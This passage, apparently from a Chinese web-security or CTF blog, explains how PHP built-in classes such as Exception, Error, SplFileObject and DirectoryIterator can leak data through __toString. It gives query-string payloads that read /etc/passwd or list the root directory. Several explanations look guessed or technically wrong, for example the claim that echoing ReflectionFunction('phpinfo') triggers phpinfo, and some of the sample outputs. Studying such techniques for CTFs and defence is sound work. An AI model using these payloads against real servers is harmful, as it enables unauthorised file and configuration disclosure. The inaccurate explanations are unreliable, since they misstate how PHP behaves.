<p>通过 <code>__toString()</code> 方法输出数据，从而被滥用于信息泄露。</p>
<h2 id="1-Exception"><a href="#1-Exception" class="headerlink" title="1. Exception"></a><strong>1. <code>Exception</code></strong></h2><p><code>Exception</code> 的 <code>__toString()</code> 方法会输出 <code>message</code>，可以用来泄露敏感信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=Exception&amp;v2=file_get_contents&amp;arg=/etc/passwd</span><br></pre></td></tr></table></figure>

<p>相当于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo new Exception(file_get_contents(&#x27;/etc/passwd&#x27;));</span><br></pre></td></tr></table></figure>

<p>如果 <code>file_get_contents(&#39;/etc/passwd&#39;)</code> 成功读取到了内容，它就会直接输出异常，导致信息泄露。</p>
<hr>
<h2 id="2-Error"><a href="#2-Error" class="headerlink" title="2. Error"></a><strong>2. <code>Error</code></strong></h2><p>PHP 7+ 之后，<code>Error</code> 继承自 <code>Throwable</code>，其行为和 <code>Exception</code> 类似：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=Error&amp;v2=file_get_contents&amp;arg=/etc/passwd</span><br></pre></td></tr></table></figure>

<p>它会输出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: /etc/passwd in script.php:3</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="3-ReflectionClass"><a href="#3-ReflectionClass" class="headerlink" title="3. ReflectionClass"></a><strong>3. <code>ReflectionClass</code></strong></h2><p><code>ReflectionClass</code> 的 <code>__toString()</code> 方法会输出类的结构信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=ReflectionClass&amp;v2=scandir&amp;arg=/</span><br></pre></td></tr></table></figure>

<p>相当于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo new ReflectionClass(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>

<p>如果 <code>scandir(&#39;/&#39;)</code> 返回根目录的文件列表，<code>ReflectionClass</code> 可能会尝试解析它，并导致错误信息输出 <strong>部分目录信息</strong>。</p>
<hr>
<h2 id="4-ReflectionFunction"><a href="#4-ReflectionFunction" class="headerlink" title="4. ReflectionFunction"></a><strong>4. <code>ReflectionFunction</code></strong></h2><p><code>ReflectionFunction</code> 也可以用于信息泄露：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=ReflectionFunction&amp;v2=phpinfo</span><br></pre></td></tr></table></figure>

<p>等效于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo new ReflectionFunction(&#x27;phpinfo&#x27;);</span><br></pre></td></tr></table></figure>

<p>这可能会导致 <code>phpinfo()</code> 输出，泄露 PHP 版本、服务器环境变量、路径等。</p>
<hr>
<h2 id="5-DateTime"><a href="#5-DateTime" class="headerlink" title="5. DateTime"></a><strong>5. <code>DateTime</code></strong></h2><p><code>DateTime</code> 类有 <code>__toString()</code> 方法，它会输出日期信息，但如果传入错误的参数，它可能会触发错误：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=DateTime&amp;v2=file_get_contents&amp;arg=/etc/passwd</span><br></pre></td></tr></table></figure>

<p>如果 <code>file_get_contents(&#39;/etc/passwd&#39;)</code> 作为 <code>DateTime</code> 的构造参数，它可能会引发错误，并在错误信息中 <strong>部分泄露</strong> <code>/etc/passwd</code>。</p>
<hr>
<h2 id="6-SimpleXMLElement"><a href="#6-SimpleXMLElement" class="headerlink" title="6. SimpleXMLElement"></a><strong>6. <code>SimpleXMLElement</code></strong></h2><p>如果你传入 XML 作为字符串，它可能会解析并输出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=SimpleXMLElement&amp;v2=file_get_contents&amp;arg=/etc/passwd</span><br></pre></td></tr></table></figure>

<p>它的 <code>__toString()</code> 方法可能会输出解析后的 XML，如果 <code>/etc/passwd</code> 格式合适，可能会导致信息泄露。</p>
<hr>
<h2 id="7-DOMDocument"><a href="#7-DOMDocument" class="headerlink" title="7. DOMDocument"></a><strong>7. <code>DOMDocument</code></strong></h2><p><code>DOMDocument</code> 也可以用于文件读取攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=DOMDocument&amp;v2=file_get_contents&amp;arg=/etc/passwd</span><br></pre></td></tr></table></figure>

<p>它的 <code>__toString()</code> 方法可能会尝试解析 <code>/etc/passwd</code>，并在错误信息中泄露部分内容。</p>
<hr>
<h2 id="8-SplFileObject"><a href="#8-SplFileObject" class="headerlink" title="8. SplFileObject"></a><strong>8. <code>SplFileObject</code></strong></h2><p><code>SplFileObject</code> 直接与文件系统交互：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=SplFileObject&amp;v2=file_get_contents&amp;arg=/etc/passwd</span><br></pre></td></tr></table></figure>

<p>可能会读取文件并尝试解析它，导致部分数据泄露。</p>
<hr>
<h2 id="9-FilesystemIterator"><a href="#9-FilesystemIterator" class="headerlink" title="9. FilesystemIterator"></a><strong>9. <code>FilesystemIterator</code></strong></h2><p><code>FilesystemIterator</code> 可以遍历目录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=FilesystemIterator&amp;v2=scandir&amp;arg=/</span><br></pre></td></tr></table></figure>

<p>如果 <code>scandir(&#39;/&#39;)</code> 返回目录列表，<code>FilesystemIterator</code> 可能会输出 <strong>部分目录结构</strong>。</p>
<hr>
<h2 id="10-DirectoryIterator"><a href="#10-DirectoryIterator" class="headerlink" title="10. DirectoryIterator"></a><strong>10. <code>DirectoryIterator</code></strong></h2><p><code>DirectoryIterator</code> 类似于 <code>FilesystemIterator</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=DirectoryIterator&amp;v2=scandir&amp;arg=/</span><br></pre></td></tr></table></figure>

<p>它可能会输出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIterator Object ( [pathName] =&gt; /etc )</span><br></pre></td></tr></table></figure>

<p>如果路径可访问，它可以用于 <strong>遍历目录</strong>。</p>
<p>攻击者可以用 <strong>各种 PHP 内置类</strong> 来输出敏感信息，例如：</p>
<table>
<thead>
<tr>
<th>类</th>
<th>可能泄露的信息</th>
</tr>
</thead>
<tbody><tr>
<td><code>Exception</code></td>
<td>文件内容、错误信息</td>
</tr>
<tr>
<td><code>Error</code></td>
<td>类似 <code>Exception</code>，但用于 PHP 7+</td>
</tr>
<tr>
<td><code>ReflectionClass</code></td>
<td>类定义信息（可能间接泄露）</td>
</tr>
<tr>
<td><code>ReflectionFunction</code></td>
<td>可能导致 <code>phpinfo()</code> 泄露</td>
</tr>
<tr>
<td><code>DateTime</code></td>
<td>可能引发错误并泄露内容</td>
</tr>
<tr>
<td><code>SimpleXMLElement</code></td>
<td>可能解析 XML 格式的文件</td>
</tr>
<tr>
<td><code>DOMDocument</code></td>
<td>可能解析 HTML&#x2F;XML 并导致信息泄露</td>
</tr>
<tr>
<td><code>SplFileObject</code></td>
<td>可能读取文件并输出</td>
</tr>
<tr>
<td><code>FilesystemIterator</code></td>
<td>可能遍历目录</td>
</tr>
<tr>
<td><code>DirectoryIterator</code></td>
<td>可能遍历目录</td>
</tr>
</tbody></table>
<p><strong><code>Exception</code> &#x2F; <code>Error</code></strong>（错误信息泄露）</p>
<p><strong><code>ReflectionClass</code></strong>（类信息泄露）</p>
<p><strong><code>SplFileObject</code> &#x2F; <code>FilesystemIterator</code></strong>（文件&#x2F;目录遍历）</p>
<p><strong><code>DirectoryIterator</code></strong>（目录遍历）</p>
<p><strong><code>DOMDocument</code> &#x2F; <code>SimpleXMLElement</code></strong>（XML 解析）</p>
